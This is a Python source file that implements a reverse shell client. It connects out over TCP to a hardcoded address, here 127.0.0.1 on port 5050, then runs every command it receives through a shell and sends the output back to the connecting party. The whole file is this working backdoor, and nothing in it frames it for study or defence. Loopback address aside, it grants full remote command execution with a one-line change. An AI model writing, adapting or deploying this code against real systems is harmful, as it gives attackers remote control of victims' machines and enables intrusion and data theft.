import os
import socket
import subprocess
import sys

def receiver(s):
    """Receive system commands and execute them."""
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            x1 = f'{os.getcwd()}>'
            s.send(x1.encode())
            continue
        if len(cmd) == 2 and ":" in cmd:
            os.chdir(cmd)
            x2 = f'{os.getcwd()}>'
            s.send(x2.encode())

        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            x3 = f'{os.getcwd()}>'
            s.sendall(data + x3.encode())

def connect(address):
    """Establish a connection to the address, then call receiver()"""
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection Established.")
        print(f"Address: {address}")
        x5 = f'{os.getcwd()}>'
        s.send(x5.encode())

    except socket.error as error:
        print("Something went wrong... more info below.")
        print(error)
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 5050
    connect((host, port))